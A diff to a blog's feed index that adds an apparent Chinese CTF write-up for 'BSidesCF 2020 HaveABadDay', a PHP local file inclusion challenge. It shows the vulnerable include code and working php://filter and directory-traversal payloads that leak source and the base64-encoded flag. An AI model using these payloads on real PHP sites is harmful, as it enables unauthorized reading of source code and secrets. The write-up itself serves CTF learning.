@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>BSidesCF:2020-HaveABadDay</title>
+      <link href="2021/07/02/bsidescf-2020-haveabadday/"/>
+      <url>2021/07/02/bsidescf-2020-haveabadday/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708083329054.png" alt="image-20210708083329054"></p><pre><code>?category=php://filter/convert.base64-encode/resource=index.php</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085144001.png" alt="image-20210708085144001"></p><pre><code>?category=php://filter/convert.base64-encode/resource=index</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085240233.png" alt="image-20210708085240233"></p><p>关键源码：</p><pre><code>   &lt;?php                $file = $_GET['category'];                if(isset($file))                {                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){                        include ($file . '.php');                    }                    else{                        echo "Sorry, we currently only support woofers and meowers.";                    }                }                ?&gt;</code></pre><p>即需要存在woofers，meomers或者index，尝试读取：</p><pre><code>?category=meowers/../flag</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708085819451.png" alt="image-20210708085819451"></p><pre><code>?category=php://filter/convert.base64-encode/index/resource=flag</code></pre><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090020025.png" alt="image-20210708090020025"></p><p>PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NjhkMDc0Y2ItNWY2Zi00MGZmLTg2MTEtZmI1NGM5NWNjY2EwfQo/Pgo=            </p><p><img src="/2021/07/02/bsidescf-2020-haveabadday/image-20210708090007549.png" alt="image-20210708090007549"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>De1CTF:2019-SSRFMe</title>
       <link href="2021/07/01/de1ctf-2019-ssrfme/"/>
       <url>2021/07/01/de1ctf-2019-ssrfme/</url>
